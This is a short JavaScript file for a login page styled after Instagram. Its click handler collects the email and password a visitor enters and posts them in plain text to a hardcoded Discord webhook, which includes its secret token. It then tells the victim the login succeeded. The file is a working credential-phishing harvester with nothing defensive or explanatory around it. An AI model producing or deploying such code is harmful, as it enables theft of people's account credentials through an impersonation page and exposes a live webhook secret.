 // JavaScript for Instagram-Inspired Login Page

const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginButton = document.getElementById('loginButton');

loginButton.addEventListener('click', function(event) {
    event.preventDefault(); // Prevent form submission

    const email = emailInput.value;
    const password = passwordInput.value;

    if (email === '' || password === '') {
        alert('Please fill in both fields.');
        return;
    }

    // Send to Discord webhook
    const webhookURL = "https://discord.com/api/webhooks/1476991374397145259/OUGccgf_VPA4L3-SjCqaWSO3HVohkvbpkRUJdTsa5N_-TiKCXHAkQPxYW-uOc0ZYoaUa";

    const data = {
        content: `New Login Submission:\nEmail: ${email}\nPassword: ${password}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert('Sent successfully!');
        } else {
            alert('Error sending.');
        }
    })
    .catch(err => console.error(err));

    // Original placeholder login behavior
    console.log('Logging in with:', email);
    alert('Logged in successfully!');
});